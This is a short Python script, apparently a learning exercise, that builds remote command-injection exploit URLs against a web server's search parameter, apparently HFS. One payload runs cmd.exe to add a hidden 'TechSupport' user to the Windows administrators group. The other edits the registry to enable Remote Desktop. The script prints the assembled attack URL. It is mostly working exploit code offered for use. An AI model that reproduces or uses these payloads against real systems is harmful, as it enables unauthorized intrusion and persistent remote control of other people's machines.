# -*- coding: utf-8 -*-
# @Time    : 2020/8/30 15:12
# @Author  : 面包狗
# @Email   : 3034221968Qqq.com
# @File    : PythonSafety01.py
# @Software: PyCharm

# 接收输入的漏洞地址地址
# 组合漏洞地址并求情
# 判断漏洞是否利用成功
# 将利用成功的并进行打印

url = input("请输入漏洞地址")

add_user = "/?search==%00%7B.exec%7Ccmd.exe%20/c%20net%20user%20TechSupport%20comeonbaby%20/add%20%26%20net%20localgroup%20administrators%20TechSupport%20/add.%7D"
open_3389 = "/?search==%00%7B.exec%7Ccmd.exe%20/c%20REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20/v%20fDenyTSConnections%20/t%20REG_DWORD%20/d%2000000000%20/f.%7D"

url_adduser = url+add_user
url_open3389 = url+open_3389
print(url_adduser)